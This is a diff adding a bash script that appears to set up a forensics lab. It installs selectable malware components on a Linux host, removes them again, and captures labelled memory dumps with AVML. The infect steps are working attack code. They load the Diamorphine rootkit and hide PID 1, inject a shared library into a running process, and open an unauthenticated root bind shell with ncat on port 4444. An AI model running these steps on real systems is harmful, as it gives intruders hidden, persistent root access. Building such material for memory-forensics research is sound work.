@@ -1,0 +1,200 @@
+#!/usr/bin/env bash
+
+set -e
+
+ROOTKIT_MODULE="diamorphine"
+ROOTKIT_DIR="/tmp/Diamorphine"
+INJECTOR_DIR="/tmp/linux-inject"
+EVIL_LIB="/tmp/evil.so"
+BACKDOOR_PORT=4444
+SLEEP_PID_FILE="/tmp/sleep_infected.pid"
+
+FLAG_ROOTKIT="/tmp/.rootkit_active"
+FLAG_INJECTION="/tmp/.injection_active"
+FLAG_BACKDOOR="/tmp/.backdoor_active"
+
+AVML_PATH="/tmp/avml"
+AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"
+
+# --- Install helpers ---
+install_rootkit() {
+    if [ -f "$FLAG_ROOTKIT" ]; then
+        echo "[*] Rootkit already installed."
+        return 0
+    fi
+    cd /tmp
+    [ -d "$ROOTKIT_DIR" ] || git clone https://github.com/m0nad/Diamorphine "$ROOTKIT_DIR"
+    cd "$ROOTKIT_DIR" && make
+    sudo insmod diamorphine.ko
+    sudo kill -31 1   # hide PID 1
+    touch "$FLAG_ROOTKIT"
+    echo "[+] Rootkit loaded."
+}
+
+install_injection() {
+    if [ -f "$FLAG_INJECTION" ]; then
+        echo "[*] Code injection already active."
+        return 0
+    fi
+    cd /tmp
+    [ -d "$INJECTOR_DIR" ] || git clone https://github.com/gaffe23/linux-inject "$INJECTOR_DIR"
+    cd "$INJECTOR_DIR" && make x86_64
+    [ -f "$EVIL_LIB" ] || {
+        cat > evil.c << 'EOF'
+#include <stdio.h>
+#include <unistd.h>
+__attribute__((constructor)) void evil_init() {
+    FILE *fp = fopen("/tmp/owned", "w");
+    fprintf(fp, "Injected!\n");
+    fclose(fp);
+}
+EOF
+        gcc -shared -fPIC evil.c -o "$EVIL_LIB"
+    }
+    /usr/bin/sleep 9999 &
+    local pid=$!
+    sleep 1
+    echo $pid > "$SLEEP_PID_FILE"
+    sudo ./inject -p $pid "$EVIL_LIB"
+    touch "$FLAG_INJECTION"
+    echo "[+] Code injected into PID $pid"
+}
+
+install_backdoor() {
+    if [ -f "$FLAG_BACKDOOR" ]; then
+        echo "[*] Backdoor already active."
+        return 0
+    fi
+    sudo apt install -y ncat 2>/dev/null
+    sudo ncat -l -k -p $BACKDOOR_PORT -e /bin/bash &
+    touch "$FLAG_BACKDOOR"
+    echo "[+] Bind shell on port $BACKDOOR_PORT"
+}
+
+# --- Clean helpers ---
+clean_rootkit() {
+    lsmod | grep -q "^${ROOTKIT_MODULE} " && sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || true
+    rm -f "$FLAG_ROOTKIT"
+}
+
+clean_injection() {
+    [ -f "$SLEEP_PID_FILE" ] && {
+        local pid=$(cat "$SLEEP_PID_FILE")
+        ps -p $pid > /dev/null 2>&1 && sudo kill $pid 2>/dev/null
+        rm -f "$SLEEP_PID_FILE"
+    }
+    rm -f "$EVIL_LIB" "$FLAG_INJECTION"
+}
+
+clean_backdoor() {
+    local pid=$(pgrep -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true)
+    [ -n "$pid" ] && sudo kill $pid 2>/dev/null
+    rm -f "$FLAG_BACKDOOR"
+}
+
+# Parse comma-separated components
+parse_components() {
+    local input="$1"
+    [ "$input" = "all" ] && echo "rootkit injection backdoor" || echo "${input//,/ }"
+}
+
+# Return currently active component names based on flag files
+active_components() {
+    local comps=()
+    [ -f "$FLAG_ROOTKIT" ] && comps+=("rootkit")
+    [ -f "$FLAG_INJECTION" ] && comps+=("injection")
+    [ -f "$FLAG_BACKDOOR" ] && comps+=("backdoor")
+    [ ${#comps[@]} -eq 0 ] && comps+=("clean")
+    echo "${comps[@]}"
+}
+
+# Download AVML if not already present
+ensure_avml() {
+    if [ -f "$AVML_PATH" ]; then
+        return 0
+    fi
+    echo "[*] Downloading AVML..."
+    wget -q "$AVML_URL" -O "$AVML_PATH"
+    chmod +x "$AVML_PATH"
+    echo "[+] AVML ready at $AVML_PATH"
+}
+
+# Capture memory and name the dump appropriately
+capture_memory() {
+    ensure_avml
+    local timestamp=$(date +%Y%m%d_%H%M%S)
+    local comps=( $(active_components) )
+    # Join array with underscores
+    local IFS=_
+    local name="memdump_${timestamp}_${comps[*]}.raw"
+    echo "[*] Capturing memory to $name ..."
+    sudo "$AVML_PATH" --compress "$name"
+    echo "[+] Memory dump saved: $name"
+}
+
+show_status() {
+    local comps=( $(active_components) )
+    if [ "${comps[0]}" = "clean" ]; then
+        echo "[+] Machine is clean."
+    else
+        echo "[!] Active malware components: ${comps[*]}"
+    fi
+}
+
+# --- Main ---
+USAGE="Usage: $0 [-i | -c | -s] [-C components] [-a]
+  -i INFECT   -c CLEAN   -s STATUS
+  -C comps     Comma-separated list or 'all' (default: all)
+  -a           Capture memory with AVML after the action"
+
+ACTION=""
+COMPONENTS="all"
+CAPTURE=false
+
+while getopts "icsC:a" opt; do
+    case $opt in
+        i) ACTION="infect";;
+        c) ACTION="clean";;
+        s) ACTION="status";;
+        C) COMPONENTS="$OPTARG";;
+        a) CAPTURE=true;;
+        *) echo "$USAGE"; exit 1;;
+    esac
+done
+
+if [ -z "$ACTION" ]; then
+    echo "$USAGE"
+    exit 1
+fi
+
+COMP_LIST=$(parse_components "$COMPONENTS")
+
+# Perform the primary action
+if [ "$ACTION" = "status" ]; then
+    show_status
+elif [ "$ACTION" = "infect" ]; then
+    for comp in $COMP_LIST; do
+        case $comp in
+            rootkit)   install_rootkit;;
+            injection) install_injection;;
+            backdoor)  install_backdoor;;
+            *) echo "Unknown component: $comp"; exit 1;;
+        esac
+    done
+    echo "[+] Infection complete."
+elif [ "$ACTION" = "clean" ]; then
+    for comp in $COMP_LIST; do
+        case $comp in
+            rootkit)   clean_rootkit;;
+            injection) clean_injection;;
+            backdoor)  clean_backdoor;;
+            *) echo "Unknown component: $comp"; exit 1;;
+        esac
+    done
+    echo "[+] Cleanup complete."
+fi
+
+# If -a was given, capture memory after the action
+if $CAPTURE; then
+    capture_memory
+fi
